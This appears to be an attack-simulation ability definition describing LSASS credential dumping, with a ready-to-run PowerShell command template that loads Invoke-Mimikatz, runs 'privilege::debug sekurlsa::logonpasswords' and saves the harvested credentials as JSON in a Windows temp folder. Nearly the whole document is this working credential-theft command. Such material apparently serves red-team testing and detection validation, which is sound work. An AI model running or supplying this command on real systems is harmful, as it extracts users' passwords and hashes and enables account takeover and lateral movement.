ability.name: LSASS Dumping and Parsing via Invoke-Mimikatz
ability.description: Utilizes pre-uploaded Invoke-Mimikatz script to attempt credential harvesting and stores structured JSON.

stages.command_template: $d='C:\\Windows\\Temp\\bas\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { . .\\Invoke-Mimikatz.ps1; $res = Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonpasswords\" -ErrorAction Stop; '{\"status\": \"success\", \"output\": \"' + $res.Replace('\"', '\\\"').Replace(\"`r`n\", \"\\n\") + '\"}' } catch { '{\"status\": \"failed\", \"error\": \"' + $_.Exception.Message.Replace('\"', '\\\"') + '\"}' }) | Tee-Object -FilePath $d\\lsass_parsed.json

rationale: Required verification of credential-dumping capabilities from LSASS.
